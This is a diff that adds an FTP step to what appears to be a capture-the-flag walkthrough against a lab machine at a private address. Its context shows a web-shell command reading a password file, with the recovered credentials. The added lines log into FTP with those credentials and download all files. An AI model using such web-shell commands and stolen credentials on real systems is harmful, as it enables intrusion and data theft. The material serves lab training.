@@ -342,3 +342,35 @@ Running [cmd=cat /home/LOOKATME/password](https://192.168.56.101/forum/templates
 ```
 lmezard:G!@M6f4Eatau{sF"
 ```
+
+# FTP
+```shell
+┌──(kali㉿kali)-[~]
+└─$ ftp lmezard@192.168.56.101
+Connected to 192.168.56.101.
+220 Welcome on this server
+331 Please specify the password.
+Password: G!@M6f4Eatau{sF"
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||44578|)
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+ftp> mget *
+mget README [anpqy?]? a
+Prompting off for duration of mget.
+229 Entering Extended Passive Mode (|||15980|)
+150 Opening BINARY mode data connection for README (96 bytes).
+100% |****************************************************************************************|    96        2.28 MiB/s    00:00 ETA
+226 Transfer complete.
+96 bytes received in 00:00 (515.10 KiB/s)
+229 Entering Extended Passive Mode (|||51397|)
+150 Opening BINARY mode data connection for fun (808960 bytes).
+100% |****************************************************************************************|   790 KiB   56.21 MiB/s    00:00 ETA
+226 Transfer complete.
+808960 bytes received in 00:00 (55.12 MiB/s)
+
+```
